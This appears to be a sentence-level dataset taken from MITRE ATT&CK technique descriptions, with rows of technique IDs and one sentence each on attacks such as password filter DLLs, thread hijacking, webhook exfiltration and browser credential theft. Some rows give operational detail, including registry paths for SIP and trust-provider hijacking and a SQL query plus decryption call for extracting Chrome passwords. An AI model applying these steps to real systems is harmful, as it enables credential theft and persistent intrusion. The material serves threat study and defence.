5210,T1498,T1498.002,Reflection Amplification,"Likewise, one or more reflectors may be used to focus traffic on the target."
5211,T1498,T1498.002,Reflection Amplification,This Network DoS attack may also reduce the availability and functionality of the targeted system and network.
5212,T1498,T1498.002,Reflection Amplification,"Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack."
5213,T1498,T1498.002,Reflection Amplification,Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers.
5214,T1498,T1498.002,Reflection Amplification,"The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume."

5216,T1498,T1498.002,Reflection Amplification,"In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet."
5217,T1556,T1556.002,Password Filter DLL,Adversaries may register malicious password filter dynamic link libraries  into the authentication process to acquire user credentials as they are validated.
5218,T1556,T1556.002,Password Filter DLL,Windows password filters are password policy enforcement mechanisms for both domain and local accounts.
5219,T1556,T1556.002,Password Filter DLL,Filters are implemented as DLLs containing a method to validate potential passwords against password policies.
5220,T1556,T1556.002,Password Filter DLL,Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.
5221,T1556,T1556.002,Password Filter DLL,"Before registering new passwords in the Security Accounts Manager , the Local Security Authority  requests validation from each registered filter."
5222,T1556,T1556.002,Password Filter DLL,Any potential changes cannot take effect until every registered filter acknowledges validation.
5223,T1556,T1556.002,Password Filter DLL,Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains.
5224,T1556,T1556.002,Password Filter DLL,"To perform proper validation, filters must receive plain-text credentials from the LSA."
5225,T1556,T1556.002,Password Filter DLL,A malicious password filter would receive these plain-text credentials every time a password request is made.
5226,T1556,T1556.002,Password Filter DLL,"Remsec, harvests plain-text credentials as a password filter registered on domain controllers."
5227,T1556,T1556.002,Password Filter DLL,"Strider, has registered its persistence module on domain controllers as a Windows LSA  password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password."
5228,T1505,T1505.005,Terminal Services DLL,Adversaries may abuse components of Terminal Services to enable persistent access to systems.
5229,T1505,T1505.005,Terminal Services DLL,"Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts."
5230,T1505,T1505.005,Terminal Services DLL,"Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP."
5231,T1505,T1505.005,Terminal Services DLL,"Windows Service,s that are run as a ""generic"" process  load the service's DLL file, the location of which is stored in a Registry entry named ServiceDll."
5232,T1505,T1505.005,Terminal Services DLL,"The termsrv.dll file, typically stored in `%SystemRoot%\System32\`, is the default ServiceDll value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`."
5233,T1505,T1505.005,Terminal Services DLL,Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.
5234,T1505,T1505.005,Terminal Services DLL,Modifications to this DLL could be done to execute arbitrary payloads  as well as to simply enable abusable features of Terminal Services.
5235,T1505,T1505.005,Terminal Services DLL,"For example, an adversary may enable features such as concurrent Remote Desktop Protocol, sessions by either patching the termsrv.dll file or modifying the ServiceDll value to point to a DLL that provides increased RDP functionality."
5236,T1505,T1505.005,Terminal Services DLL,On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.
5237,T1059,T1059.002,AppleScript,Adversaries may abuse AppleScript for execution.
5238,T1059,T1059.002,AppleScript,AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.
5239,T1059,T1059.002,AppleScript,These AppleEvent messages can be sent independently or easily scripted with AppleScript.
5240,T1059,T1059.002,AppleScript,"These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely."
5241,T1059,T1059.002,AppleScript,"Scripts can be run from the command-line via osascript /path/to/script or osascript -e ""script here""."
5242,T1059,T1059.002,AppleScript,"Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows."
5243,T1059,T1059.002,AppleScript,AppleScripts can also be executed as plain text shell scripts by adding #!/usr/bin/osascript to the start of the script file.
5244,T1059,T1059.002,AppleScript,AppleScripts do not need to call osascript to execute.
5245,T1059,T1059.002,AppleScript,"However, they may be executed from within mach-O binaries by using the macOS Native API,s NSAppleScript or OSAScript, both of which execute code independent of the /usr/bin/osascript command line utility."
5246,T1059,T1059.002,AppleScript,"Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes."
5247,T1059,T1059.002,AppleScript,"These events cannot start applications remotely , but they can interact with applications if they're already running remotely."
5248,T1059,T1059.002,AppleScript,"On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native API,s, which otherwise would require compilation and execution in a mach-O binary file format."
5249,T1059,T1059.002,AppleScript,"Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python,."

5255,T1176,T1176,Browser Extensions,Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers.
5256,T1176,T1176,Browser Extensions,They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.
5257,T1176,T1176,Browser Extensions,"Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system."
5258,T1176,T1176,Browser Extensions,Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.
5259,T1176,T1176,Browser Extensions,"Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions."
5260,T1176,T1176,Browser Extensions,"Previous to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files."
5261,T1176,T1176,Browser Extensions,"In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction."
5262,T1176,T1176,Browser Extensions,"Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser , and be used as an installer for a RAT for persistence."

5274,T1499,T1499.002,Service Exhaustion Flood,"One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it."
5275,T1499,T1499.002,Service Exhaustion Flood,"This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service."
5276,T1499,T1499.002,Service Exhaustion Flood,"Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS."
5277,T1499,T1499.002,Service Exhaustion Flood,The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections.
5278,T1499,T1499.002,Service Exhaustion Flood,"If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm."
5279,T1499,T1499.002,Service Exhaustion Flood,"In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests."

6191,T1558,T1558,Steal or Forge Kerberos Tickets,"Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux."
6192,T1558,T1558,Steal or Forge Kerberos Tickets,"By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access."
6193,T1558,T1558,Steal or Forge Kerberos Tickets,The storage location for these ccache entries is influenced by the /etc/krb5.conf configuration file and the KRB5CCNAME environment variable which can specify to save them to disk or keep them protected via the KCM daemon.
6194,T1558,T1558,Steal or Forge Kerberos Tickets,"Users can interact with ticket storage using kinit, klist, ktutil, and kcc built-in binaries or via Apple's native Kerberos framework."
6195,T1558,T1558,Steal or Forge Kerberos Tickets,Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.

6328,T1055,T1055.003,Thread Execution Hijacking,Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.
6329,T1055,T1055.003,Thread Execution Hijacking,Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.
6330,T1055,T1055.003,Thread Execution Hijacking,"Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL."
6331,T1055,T1055.003,Thread Execution Hijacking,A handle to an existing victim process is first created with native Windows API calls such as OpenThread.
6332,T1055,T1055.003,Thread Execution Hijacking,"At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively."
6333,T1055,T1055.003,Thread Execution Hijacking,"This is very similar to Process Hollowing, but targets an existing process rather than creating a process in a suspended state."
6334,T1055,T1055.003,Thread Execution Hijacking,Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.
6335,T1055,T1055.003,Thread Execution Hijacking,"Waterbear, can use thread injection to inject shellcode into the process of security software."

6396,T1546,T1546.011,Application Shimming,Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.
6397,T1546,T1546.011,Application Shimming,The Microsoft Windows Application Compatibility Infrastructure/Framework  was created to allow for backward compatibility of software as the operating system codebase changes over time.
6398,T1546,T1546.011,Application Shimming,"For example, the application shimming feature allows developers to apply fixes to applications  that were created for Windows XP so that it will work with Windows 10."
6399,T1546,T1546.011,Application Shimming,"Within the framework, shims are created to act as a buffer between the program  and the Windows OS."
6400,T1546,T1546.011,Application Shimming,"When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database ."
6401,T1546,T1546.011,Application Shimming,"If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS."
6402,T1546,T1546.011,Application Shimming,"A list of all shims currently installed by the default Windows installer  is kept in:
* %WINDIR%\AppPatch\sysmain.sdb and
* hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb
Custom databases are stored in:
* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and
* hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom
To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim."
6403,T1546,T1546.011,Application Shimming,"However, certain shims can be used to Bypass User Account Control, , inject DLLs into processes , disable Data Execution Prevention  and Structure Exception Handling , and intercept memory addresses ."
6404,T1546,T1546.011,Application Shimming,"Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc."
6405,T1546,T1546.011,Application Shimming,Shims can also be abused to establish persistence by continuously being invoked by affected programs.
6406,T1546,T1546.011,Application Shimming,"Pillowmint, has used a malicious shim database to maintain persistence."
6407,T1546,T1546.011,Application Shimming,"SDBbot, has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe."

6411,T1552,T1552,Unsecured Credentials,"These credentials can be stored and/or misplaced in many locations on a system, including plaintext files , operating system or application-specific repositories ,  or other specialized files/artifacts ."
6412,T1552,T1552,Unsecured Credentials,"DarkGate, uses NirSoft tools to steal user credentials from the infected machine."
6413,T1552,T1552,Unsecured Credentials,NirSoft tools are executed via process hollowing in a newly-created instance of vbc.exe or regasm.exe.
6414,T1547,T1547.010,Port Monitors,Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation.
6415,T1547,T1547.010,Port Monitors,A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.
6416,T1547,T1547.010,Port Monitors,"This DLL can be located in C:\Windows\System32 and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot."
6417,T1547,T1547.010,Port Monitors,"Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors."
6418,T1547,T1547.010,Port Monitors,"The Registry key contains entries for the following:
* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port"
6419,T1070,T1070.008,Clear Mailbox Data,Adversaries may modify mail and mail application data to remove evidence of their activity.
6420,T1070,T1070.008,Clear Mailbox Data,Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs.
6421,T1070,T1070.008,Clear Mailbox Data,"Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests."
6422,T1070,T1070.008,Clear Mailbox Data,"Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing,/Internal Spearphishing,, Email Collection,, Mail Protocols, for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol,."
6423,T1070,T1070.008,Clear Mailbox Data,"For example, to remove evidence on Exchange servers adversaries have used the ExchangePowerShell PowerShell, module, including Remove-MailboxExportRequest to remove evidence of mailbox exports."
6424,T1070,T1070.008,Clear Mailbox Data,"On Linux and macOS, adversaries may also delete emails through a command line utility called mail  or use AppleScript, to interact with APIs on macOS."
6425,T1070,T1070.008,Clear Mailbox Data,Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity  to reduce the likelihood of malicious emails being detected by security products.
6426,T1070,T1070.008,Clear Mailbox Data,"Goopy, has the ability to delete emails used for C2 once the content has been copied."
6427,T1070,T1070.008,Clear Mailbox Data,"APT29, removed evidence of email export requests using Remove-MailboxExportRequest."
6428,T1037,T1037.002,Login Hook,Adversaries may use a Login Hook to establish persistence executed upon user logon.
6429,T1037,T1037.002,Login Hook,A login hook is a plist file that points to a specific script to execute with root privileges upon user logon.
6430,T1037,T1037.002,Login Hook,The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility.
6431,T1037,T1037.002,Login Hook,This behavior is the same for logout hooks where a script can be executed upon user logout.
6432,T1037,T1037.002,Login Hook,All hooks require administrator permissions to modify or create hooks.
6433,T1037,T1037.002,Login Hook,"Adversaries can add or insert a path to a malicious script in the com.apple.loginwindow.plist file, using the LoginHook or LogoutHook key-value pair."
6434,T1037,T1037.002,Login Hook,The malicious script is executed upon the next user login.
6435,T1037,T1037.002,Login Hook,"If a login hook already exists, adversaries can add additional commands to an existing login hook."
6436,T1037,T1037.002,Login Hook,There can be only one login and logout hook on a system at a time.
6437,T1037,T1037.002,Login Hook,"**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon, and Launch Agent,"
6438,T1659,T1659,Content Injection,Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic.
6439,T1659,T1659,Content Injection,"Rather than luring victims to malicious payloads hosted on a compromised website , Drive-by Target, followed by Drive-by Compromise,, adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content."
6440,T1659,T1659,Content Injection,"These compromised online network channels may also be used to deliver additional payloads , Ingress Tool Transfer, and other data to already compromised systems."
6441,T1659,T1659,Content Injection,"Adversaries may inject content to victim systems in various ways, including:
* From the middle, where the adversary is in-between legitimate online client-server communications , which describes AiTM activity solely within an enterprise environment 
* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server

6516,T1567,T1567.004,Exfiltration Over Webhook,Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel.
6517,T1567,T1567.004,Exfiltration Over Webhook,Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.
6518,T1567,T1567.004,Exfiltration Over Webhook,"Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello."
6519,T1567,T1567.004,Exfiltration Over Webhook,"When changes happen in the linked services , these services will automatically post the data to the webhook endpoint for use by the consuming application."
6520,T1567,T1567.004,Exfiltration Over Webhook,"Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration, of emails, chat messages, and other data."
6521,T1567,T1567.004,Exfiltration Over Webhook,"Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it."
6522,T1567,T1567.004,Exfiltration Over Webhook,"Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection."
6523,T1567,T1567.004,Exfiltration Over Webhook,Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.
6524,T1139,T1139,Bash History,"Bash keeps track of the commands users type on the command-line with the ""history"" utility."
6525,T1139,T1139,Bash History,"Once a user logs out, the history is flushed to the user’s .bash_history file."
6526,T1139,T1139,Bash History,"For each user, this file resides at the same location: ~/.bash_history."
6527,T1139,T1139,Bash History,"Typically, this file keeps track of the user’s last 500 commands."
6528,T1139,T1139,Bash History,"Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out."
6529,T1139,T1139,Bash History,Attackers can abuse this by looking through the file for potential credentials.
6530,T1205,T1205,Traffic Signaling,Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control.
6531,T1205,T1205,Traffic Signaling,"Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task."
6532,T1205,T1205,Traffic Signaling,This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.
6533,T1205,T1205,Traffic Signaling,"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports  Port Knocking,, but can involve unusual flags, specific strings, or other unique characteristics."
6534,T1205,T1205,Traffic Signaling,"After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software."
6535,T1205,T1205,Traffic Signaling,"Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value."
6536,T1205,T1205,Traffic Signaling,The observation of the signal packets to trigger the communication can be conducted through different methods.
6537,T1205,T1205,Traffic Signaling,"One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question."
6538,T1205,T1205,Traffic Signaling,"Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs."
6539,T1205,T1205,Traffic Signaling,"On network devices, adversaries may use crafted packets to enable Network Device Authentication, for standard services offered by the device such as telnet."
6540,T1205,T1205,Traffic Signaling,"Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities."
6541,T1205,T1205,Traffic Signaling,"Adversaries may use crafted packets to attempt to connect to one or more  ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives."
6542,T1205,T1205,Traffic Signaling,"To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image, due to the monolithic nature of the architecture."
6543,T1205,T1205,Traffic Signaling,Adversaries may also use the Wake-on-LAN feature to turn on powered off systems.
6544,T1205,T1205,Traffic Signaling,"Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it."
6545,T1205,T1205,Traffic Signaling,"Once the system is powered on, it may become a target for lateral movement."
6546,T1205,T1205,Traffic Signaling,"ZIPLINE, can identify a specific string in intercepted network traffic, `SSH-2.0-OpenSSH_0.3xx.`, to trigger its command functionality."
6547,T1205,T1205,Traffic Signaling,"BUSHWALK, can modify the `DSUserAgentCap.pm` Perl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests."
6548,T1205,T1205,Traffic Signaling,"Penquin, will connect to C2 only after sniffing a ""magic packet"" value in TCP or UDP packets matching specific conditions."
6549,T1205,T1205,Traffic Signaling,"SYNful Knock, can be sent instructions via special packets to change its functionality."
6550,T1205,T1205,Traffic Signaling,Code for new functionality can be included in these messages.
6551,T1205,T1205,Traffic Signaling,"Winnti for Linux, has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control  mechanism."
6552,T1205,T1205,Traffic Signaling,"Chaos, provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port."

6555,T1205,T1205,Traffic Signaling,"Pandora, can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command."
6556,T1205,T1205,Traffic Signaling,"Ryuk, has used Wake-on-Lan to power on turned off systems for lateral movement."
6557,T1205,T1205,Traffic Signaling,"Uroburos, can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific Uroburos, implant."
6558,T1205,T1205,Traffic Signaling,"If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application."
6559,T1205,T1205,Traffic Signaling,"Umbreon, provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet Chaos, provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port."
6560,T1021,T1021.008,Direct Cloud VM Connections,"Adversaries may leverage Valid Accounts, to log directly into accessible cloud hosted compute infrastructure through cloud native methods."
6561,T1021,T1021.008,Direct Cloud VM Connections,"Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API,, such as Azure Serial Console, AWS EC2 Instance Connect, and AWS System Manager..
Methods of authentication for these connections can include passwords, application access tokens, or SSH keys."
6562,T1021,T1021.008,Direct Cloud VM Connections,"These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access."
6563,T1021,T1021.008,Direct Cloud VM Connections,Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.
6564,T1021,T1021.008,Direct Cloud VM Connections,"These connections typically provide direct console access to the VM rather than the execution of scripts , Cloud Administration Command,."
6565,T1503,T1503,Credentials from Web Browsers,Adversaries may acquire credentials from web browsers by reading files specific to the target browser.
6566,T1503,T1503,Credentials from Web Browsers,Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.
6567,T1503,T1503,Credentials from Web Browsers,"Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers."
6568,T1503,T1503,Credentials from Web Browsers,"For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, AppData\Local\Google\Chrome\User Data\Default\Login Data and executing a SQL query: SELECT action_url, username_value, password_value FROM logins;."
6569,T1503,T1503,Credentials from Web Browsers,"The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function CryptUnprotectData, which uses the victim’s cached logon credentials as the decryption key."
6570,T1503,T1503,Credentials from Web Browsers,"Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc."
6571,T1503,T1503,Credentials from Web Browsers,Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.
6572,T1503,T1503,Credentials from Web Browsers,"After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access."
6573,T1503,T1503,Credentials from Web Browsers,This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts .
6574,T1218,T1218,System Binary Proxy Execution,"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries."
6575,T1218,T1218,System Binary Proxy Execution,"Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system."
6576,T1218,T1218,System Binary Proxy Execution,Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation.
6577,T1218,T1218,System Binary Proxy Execution,Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.
6578,T1218,T1218,System Binary Proxy Execution,"Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands."
6579,T1218,T1218,System Binary Proxy Execution,"Lazarus Group, lnk files used for persistence have abused the Windows Update Client  to execute a malicious DLL."
6580,T1038,T1038,DLL Search Order Hijacking,Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence.
6581,T1038,T1038,DLL Search Order Hijacking,"Adversaries may perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL."
6582,T1038,T1038,DLL Search Order Hijacking,Adversaries may use this behavior to cause the program to load a malicious DLL.
6583,T1038,T1038,DLL Search Order Hijacking,"Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation."
6584,T1038,T1038,DLL Search Order Hijacking,An adversary exploits a weakness in an application's specification of external libraries to exploit the functionality of the loader where the process loading the library searches first in the same directory in which the process binary resides and then in other directories.
6585,T1038,T1038,DLL Search Order Hijacking,Exploitation of this preferential search order can allow an attacker to make the loading process load the adversary's rogue library rather than the legitimate library.
6586,T1038,T1038,DLL Search Order Hijacking,This attack can be leveraged with many different libraries and with many different loading processes.
6587,T1038,T1038,DLL Search Order Hijacking,No forensic trails are left in the system's registry or file system that an incorrect library had been loaded.
6588,T1050,T1050,New Service,"When operating systems boot up, they can start programs or applications called services that perform background system functions."
6589,T1050,T1050,New Service,"A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry."
6590,T1050,T1050,New Service,Adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry.
6591,T1050,T1050,New Service,"The service name may be disguised by using a name from a related operating system or benign software with Masquerading,."
6592,T1050,T1050,New Service,"Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM."
6593,T1050,T1050,New Service,"When an operating system starts, it also starts programs called services or daemons."
6594,T1050,T1050,New Service,Adversaries may install a new service which will be executed at startup .
6595,T1050,T1050,New Service,The service name may be disguised by using a name from a related operating system or benign software.
6596,T1050,T1050,New Service,Services are usually run with elevated privileges.

7054,T1009,T1009,Binary Padding,Adversaries can use binary padding to add junk data and change the on-disk representation of malware without affecting the functionality or behavior of the binary.
7055,T1009,T1009,Binary Padding,This will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.
7056,T1009,T1009,Binary Padding,Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blacklists and static anti-virus signatures.
7057,T1009,T1009,Binary Padding,The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.
7058,T1009,T1009,Binary Padding,Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files.
7059,T1009,T1009,Binary Padding,This may also reduce the likelihood of being collected for analysis.
7060,T1009,T1009,Binary Padding,"Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed."

7223,T1553,T1553.003,SIP and Trust Provider Hijacking,"The signature validation process is handled via the WinVerifyTrust application programming interface  function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature."
7224,T1553,T1553.003,SIP and Trust Provider Hijacking,"Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages   to provide a layer of abstraction between API functions and files."
7225,T1553,T1553.003,SIP and Trust Provider Hijacking,"SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures."
7226,T1553,T1553.003,SIP and Trust Provider Hijacking,Unique SIPs exist for most file formats  and are identified by globally unique identifiers .
7227,T1553,T1553.003,SIP and Trust Provider Hijacking,"Similar to Code Signing,, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system."
7228,T1553,T1553.003,SIP and Trust Provider Hijacking,"Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious  code as signed by: 
* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\WOW6432Node\,Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID} that point to the dynamic link library  providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file."
7229,T1553,T1553.003,SIP and Trust Provider Hijacking,"By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value  rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP  ."
7230,T1553,T1553.003,SIP and Trust Provider Hijacking,"* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\WOW6432Node\,Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value."
7231,T1553,T1553.003,SIP and Trust Provider Hijacking,"By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE , an adversary can successfully validate any file  using that SIP  ."
7232,T1553,T1553.003,SIP and Trust Provider Hijacking,"This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk."
7233,T1553,T1553.003,SIP and Trust Provider Hijacking,"* Modifying the DLL and Function Registry values in HKLM\SOFTWARE\WOW6432Node\,Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made."
7234,T1553,T1553.003,SIP and Trust Provider Hijacking,"Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL ."
7235,T1553,T1553.003,SIP and Trust Provider Hijacking,"* **Note:** The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking,."
7236,T1553,T1553.003,SIP and Trust Provider Hijacking,"Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation."
7237,T1483,T1483,Domain Generation Algorithms,Adversaries may make use of Domain Generation Algorithms  to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains.
7238,T1483,T1483,Domain Generation Algorithms,"This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions."
7239,T1185,T1185,Browser Session Hijacking,"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques."
7240,T1185,T1185,Browser Session Hijacking,"A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet."
7241,T1185,T1185,Browser Session Hijacking,"Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights."
7242,T1185,T1185,Browser Session Hijacking,Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic.
